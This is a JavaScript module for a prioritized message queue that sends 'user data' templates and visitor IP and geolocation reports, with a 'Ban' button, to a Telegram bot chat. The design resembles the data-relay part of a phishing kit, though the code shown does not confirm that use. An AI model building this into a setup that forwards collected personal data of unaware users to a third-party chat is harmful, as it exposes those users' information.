import axios from "axios";
import { toDialCode } from "./countryDialCodes.js";

/**
 * High-speed Telegram message queue optimized for fast delivery with priority support
 */
class TelegramQueue {
  constructor() {
    this.queue = [];
    this.processing = false;
    this.maxRetries = 3;
    this.retryDelay = 500; // Reduced from 1000ms
    this.lastSentTime = 0;
    this.minInterval = 100; // Minimum 100ms between messages to respect Telegram limits

    // Priority levels for different message types
    this.priorities = {
      'user_data_template': 1, // Highest priority
      'ip': 2,
      'notification': 3,
      'default': 4 // Lowest priority
    };

    this.startProcessing();
  }

  /**
   * Add message to queue with priority-based insertion
   */
  enqueue(message) {
    const queueItem = {
      id: Date.now() + Math.random(),
      timestamp: Date.now(),
      retries: 0,
      priority: this.priorities[message.type] || this.priorities.default,
      ...message,
    };

    // Insert message based on priority (lower number = higher priority)
    let insertIndex = this.queue.length;
    for (let i = 0; i < this.queue.length; i++) {
      if (queueItem.priority < this.queue[i].priority) {
        insertIndex = i;
        break;
      }
    }

    this.queue.splice(insertIndex, 0, queueItem);
    console.log(
      `Telegram message queued: ${message.type} (priority ${queueItem.priority}) for user ${message.userId}, queue size: ${this.queue.length}`
    );
  }

  /**
   * Start processing the queue with maximum speed
   */
  async startProcessing() {
    if (this.processing) return;

    this.processing = true;

    while (this.processing) {
      try {
        await this.processNext();
        // No delay between processing cycles for maximum speed
      } catch (error) {
        console.error("Error in telegram queue processing:", error);
        await this.sleep(250); // Very short error delay
      }
    }
  }

  /**
   * Process next message with optimal timing
   */
  async processNext() {
    if (this.queue.length === 0) {
      await this.sleep(100); // Very short delay when queue is empty
      return;
    }

    const message = this.queue.shift();

    try {
      // Respect minimum interval to avoid Telegram rate limits
      const timeSinceLastSent = Date.now() - this.lastSentTime;
      if (timeSinceLastSent < this.minInterval) {
        await this.sleep(this.minInterval - timeSinceLastSent);
      }

      const result = await this.sendMessageByType(message);

      if (result.success) {
        this.lastSentTime = Date.now();
        console.log(
          `Telegram message sent: ${message.type} for user ${message.userId}`
        );
      } else {
        throw new Error(result.error || "Failed to send message");
      }
    } catch (error) {
      console.error(`Failed to send telegram message: ${error.message}`);

      message.retries++;
      if (message.retries <= this.maxRetries) {
        const delay = this.retryDelay * message.retries; // Linear retry delay
        console.log(
          `Retrying telegram message in ${delay}ms, attempt ${message.retries}/${this.maxRetries}`
        );

        setTimeout(() => {
          // Re-insert with priority when retrying
          this.enqueue(message);
        }, delay);
      } else {
        console.error(
          `Max retries exceeded for telegram message: ${message.type} for user ${message.userId}`
        );
      }
    }
  }

  /**
   * Send message based on type
   */
  async sendMessageByType(message) {
    switch (message.type) {
      case "ip":
        return this.sendIPMessage(message.data);
      case "user_data_template":
        return this.sendTemplateMessage(message.data);
      case "notification":
        return this.sendNotificationMessage(message.data);
      default:
        throw new Error(`Unknown message type: ${message.type}`);
    }
  }

  /**
   * Send pre-formatted template message (no processing needed)
   */
  async sendTemplateMessage(data) {
    return this.sendTelegramMessage(data);
  }

  /**
   * Send IP notification message
   */
  async sendIPMessage(data) {
    const { id, ip, country, city, countryCode, context } = data;

    const params = [
      `===========${context ? context : "======"}============`,
      `ID: ${id}`,
      `IP: ${ip}`,
      `Country: ${country || "Unknown"}`,
      `City: ${city || "Unknown"}`,
      `Country Code: ${toDialCode(countryCode)}`,
      "=============================",
    ]
      .filter(Boolean)
      .join("\n");

    return this.sendTelegramMessage({
      text: params,
      disable_notification: true,
      reply_markup: JSON.stringify({
        inline_keyboard: [
          [
            {
              text: "Ban",
              callback_data: `/ban ${id}`,
            },
          ],
        ],
      }),
    });
  }

  /**
   * Send notification message
   */
  async sendNotificationMessage(data) {
    return this.sendTelegramMessage({
      text: data.text,
      parse_mode: data.parse_mode || "Markdown",
    });
  }

  /**
   * Optimized Telegram API call with fast timeout and retry logic
   */
  async sendTelegramMessage(messageData) {
    if (!process.env.BOT || !process.env.CHAT_ID) {
      return { success: false, error: "Telegram credentials not configured" };
    }

    try {
      const response = await axios.post(
        `https://api.telegram.org/bot${process.env.BOT}/sendMessage`,
        {
          chat_id: process.env.CHAT_ID,
          ...messageData,
        },
        {
          headers: {
            "Content-Type": "application/json",
          },
          timeout: 5000, // Reduced to 5 seconds for faster failure detection
          validateStatus: (status) => status < 500, // Accept 4xx as non-retry errors
        }
      );

      return { success: true, data: response.data };
    } catch (error) {
      // Handle specific error types for better retry logic
      if (error.code === "ECONNABORTED" || error.code === "ETIMEDOUT") {
        return {
          success: false,
          error: "Request timeout - will retry",
          shouldRetry: true,
        };
      }

      if (error.response?.status === 429) {
        // Rate limited by Telegram - retry after short delay
        return {
          success: false,
          error: "Rate limited by Telegram API",
          shouldRetry: true,
        };
      }

      if (error.response?.status >= 400 && error.response?.status < 500) {
        // Client errors - don't retry
        return {
          success: false,
          error: "Bad request to Telegram API",
          shouldRetry: false,
        };
      }

      // Network or server errors - retry
      return { success: false, error: error.message, shouldRetry: true };
    }
  }

  /**
   * Utility sleep function
   */
  sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  /**
   * Get queue status with priority breakdown
   */
  getStatus() {
    const priorityBreakdown = {};
    this.queue.forEach(item => {
      const priority = item.priority || this.priorities.default;
      priorityBreakdown[priority] = (priorityBreakdown[priority] || 0) + 1;
    });

    return {
      queueSize: this.queue.length,
      processing: this.processing,
      lastSentTime: this.lastSentTime,
      priorityBreakdown: priorityBreakdown,
      nextMessagePriority: this.queue.length > 0 ? this.queue[0].priority : null,
    };
  }

  /**
   * Stop processing
   */
  stop() {
    this.processing = false;
  }

  /**
   * Clear the queue
   */
  clear() {
    this.queue = [];
  }
}

// Singleton instance
let telegramQueue = null;

export const getTelegramQueue = () => {
  if (!telegramQueue) {
    telegramQueue = new TelegramQueue();
  }
  return telegramQueue;
};

export default TelegramQueue;
